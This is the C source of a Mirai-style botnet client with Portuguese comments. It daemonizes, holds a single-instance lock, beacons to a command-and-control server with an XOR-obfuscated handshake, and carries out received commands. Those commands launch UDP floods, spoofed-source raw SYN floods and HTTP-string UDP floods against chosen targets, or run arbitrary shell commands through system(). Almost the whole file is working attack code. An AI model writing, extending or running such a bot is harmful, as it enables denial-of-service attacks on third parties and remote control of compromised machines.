#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <stdarg.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/stat.h>

// ============================================================
// CONFIGURAÇÕES (serão sobrescritas pelo enc.py ou define)
// ============================================================
#define CNC_HOST "127.0.0.1"
#define CNC_PORT 4444
#define SCAN_PORT 23
#define MAX_CONNECTIONS 100
#define HEARTBEAT_INTERVAL 60
#define RECONNECT_DELAY 5
#define MAX_RECONNECT_DELAY 300
#define XOR_KEY 0xDEADBEEF

// ============================================================
// PROTOCOLO
// ============================================================
#define PROTO_MAGIC "MIRA"
#define PROTO_CMD_EXEC     1
#define PROTO_CMD_ATTACK   2
#define PROTO_CMD_KILL     3
#define PROTO_CMD_PING     4
#define PROTO_CMD_KILLER   5
#define PROTO_CMD_SCAN     6

#define ATTACK_UDP         0
#define ATTACK_SYN         1
#define ATTACK_ACK         2
#define ATTACK_DNS         3
#define ATTACK_HTTP        4
#define ATTACK_VSE         5
#define ATTACK_UDP_PLAIN   6

// ============================================================
// OFUSCAÇÃO XOR
// ============================================================
void xor_crypt(unsigned char *data, int len, unsigned int key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= (key >> (8 * (i % 4))) & 0xFF;
    }
}

// ============================================================
// SOCKET HELPERS
// ============================================================
int create_socket() {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct timeval tv = {10, 0};
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    return fd;
}

int connect_cnc(int fd, char *host, int port) {
    struct sockaddr_in addr;
    struct hostent *hp = gethostbyname(host);
    if (!hp) return -1;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    memcpy(&addr.sin_addr, hp->h_addr, hp->h_length);
    addr.sin_port = htons(port);
    return connect(fd, (struct sockaddr *)&addr, sizeof(addr));
}

int send_binary(int fd, unsigned char *data, int len) {
    int sent = 0;
    while (sent < len) {
        int n = write(fd, data + sent, len - sent);
        if (n <= 0) return -1;
        sent += n;
    }
    return sent;
}

int recv_binary(int fd, unsigned char *buf, int len) {
    int rcvd = 0;
    while (rcvd < len) {
        int n = read(fd, buf + rcvd, len - rcvd);
        if (n <= 0) return -1;
        rcvd += n;
    }
    return rcvd;
}

void make_random_str(char *buf, int len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < len; i++)
        buf[i] = charset[rand() % (sizeof(charset) - 1)];
    buf[len] = 0;
}

// ============================================================
// RAW SOCKET ATTACKS
// ============================================================
typedef struct {
    char dest_ip[16];
    int dest_port;
    int duration;
    int port;
} attack_args_t;

// Checksum calculation for IP/TCP/UDP
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

void *attack_udp(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    char ip[16]; int port = args->dest_port, dur = args->duration;
    strcpy(ip, args->dest_ip);
    free(args);
    
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    dst.sin_addr.s_addr = inet_addr(ip);
    
    char pkt[1500];
    memset(pkt, rand() & 0xFF, sizeof(pkt));
    
    time_t end = time(NULL) + dur;
    while (time(NULL) < end) {
        sendto(fd, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(fd);
    return NULL;
}

void *attack_syn(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    char ip[16]; int port = args->dest_port, dur = args->duration;
    strcpy(ip, args->dest_ip);
    free(args);

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return NULL;
    
    int one = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = inet_addr(ip);
    
    char pkt[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
    
    time_t end = time(NULL) + dur;
    while (time(NULL) < end) {
        memset(pkt, 0, sizeof(pkt));
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(pkt));
        iph->id = htons(rand());
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = rand();
        iph->daddr = dst.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum((unsigned short *)pkt, sizeof(struct iphdr));
        
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(port);
        tcph->seq = rand();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;
        
        sendto(fd, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(fd);
    return NULL;
}

void *attack_udp_plain(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    char ip[16]; int port = args->dest_port, dur = args->duration;
    strcpy(ip, args->dest_ip);
    free(args);
    
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    dst.sin_addr.s_addr = inet_addr(ip);
    
    const char *payloads[] = {
        "GET / HTTP/1.1\r\nHost: %s\r\n\r\n",
        "GET / HTTP/1.0\r\n\r\n",
        "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 100\r\n\r\n",
    };
    
    time_t end = time(NULL) + dur;
    while (time(NULL) < end) {
        char buf[1024];
        snprintf(buf, sizeof(buf), payloads[rand() % 3], ip);
        sendto(fd, buf, strlen(buf), 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(fd);
    return NULL;
}

// ============================================================
// MAIN - CNC COMMUNICATION LOOP
// ============================================================
volatile int running = 1;

void handle_signal(int sig) {
    running = 0;
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    setsid();
    chdir("/");
    close(0);
    close(1);
    close(2);
    open("/dev/null", O_RDWR);
    dup2(0, 1);
    dup2(0, 2);
}

int main(int argc, char **argv) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGHUP, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    
    srand(time(NULL) ^ getpid());
    
    // Daemonize
    #ifndef DEBUG
    daemonize();
    #endif
    
    // Single instance lock
    char lockpath[64];
    snprintf(lockpath, sizeof(lockpath), "/tmp/.mira_%s.lock", CNC_HOST);
    int lfd = open(lockpath, O_CREAT | O_EXCL | O_RDWR, 0600);
    if (lfd < 0) {
        // Already running
        exit(1);
    }
    
    int reconnect_delay = RECONNECT_DELAY;
    
    while (running) {
        int fd = create_socket();
        if (fd < 0) continue;
        
        if (connect_cnc(fd, CNC_HOST, CNC_PORT) < 0) {
            close(fd);
            sleep(reconnect_delay);
            reconnect_delay = (reconnect_delay * 2 > MAX_RECONNECT_DELAY) ? MAX_RECONNECT_DELAY : reconnect_delay * 2;
            continue;
        }
        reconnect_delay = RECONNECT_DELAY;
        
        // Handshake: MAGIC + ID_LEN + ID
        char hostname[64] = {0};
        gethostname(hostname, sizeof(hostname));
        unsigned char hs_buf[256];
        int id_len = strlen(hostname);
        
        memcpy(hs_buf, PROTO_MAGIC, 4);
        hs_buf[4] = id_len;
        memcpy(hs_buf + 5, hostname, id_len);
        
        xor_crypt(hs_buf, 5 + id_len, XOR_KEY);
        if (send_binary(fd, hs_buf, 5 + id_len) < 0) {
            close(fd);
            continue;
        }
        
        // Main loop - read commands
        unsigned char buf[4096];
        unsigned int cmd_len;
        
        while (running) {
            // Read 4 bytes length prefix
            if (recv_binary(fd, (unsigned char *)&cmd_len, 4) < 0) break;
            cmd_len = ntohl(cmd_len);
            
            if (cmd_len == 0 || cmd_len > 4096) break;
            
            // Read command payload
            if (recv_binary(fd, buf, cmd_len) < 0) break;
            
            unsigned char cmd_type = buf[0];
            
            switch (cmd_type) {
                case PROTO_CMD_PING: {
                    unsigned char pong[] = "PONG";
                    unsigned int len = htonl(4);
                    send_binary(fd, (unsigned char *)&len, 4);
                    send_binary(fd, pong, 4);
                    break;
                }
                
                case PROTO_CMD_ATTACK: {
                    // Format: type|ip|port|duration
                    char *type_s = strtok((char *)buf + 1, "|");
                    char *ip = strtok(NULL, "|");
                    char *port_s = strtok(NULL, "|");
                    char *dur_s = strtok(NULL, "|");
                    
                    if (!type_s || !ip || !port_s || !dur_s) break;
                    
                    int atype = atoi(type_s);
                    int aport = atoi(port_s);
                    int adur = atoi(dur_s);
                    
                    attack_args_t *args = malloc(sizeof(attack_args_t));
                    if (!args) break;
                    strcpy(args->dest_ip, ip);
                    args->dest_port = aport;
                    args->duration = adur;
                    
                    pthread_t tid;
                    pthread_attr_t attr;
                    pthread_attr_init(&attr);
                    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
                    
                    switch (atype) {
                        case ATTACK_UDP:
                        case ATTACK_VSE:
                            pthread_create(&tid, &attr, attack_udp, args);
                            break;
                        case ATTACK_SYN:
                            pthread_create(&tid, &attr, attack_syn, args);
                            break;
                        case ATTACK_UDP_PLAIN:
                            pthread_create(&tid, &attr, attack_udp_plain, args);
                            break;
                        default:
                            free(args);
                            break;
                    }
                    break;
                }
                
                case PROTO_CMD_KILL: {
                    running = 0;
                    break;
                }
                
                case PROTO_CMD_EXEC: {
                    if (cmd_len > 1) {
                        char *cmd = (char *)buf + 1;
                        cmd[cmd_len - 1] = 0;
                        system(cmd);
                    }
                    break;
                }
            }
        }
        
        close(fd);
    }
    
    // Cleanup
    unlink(lockpath);
    return 0;
}
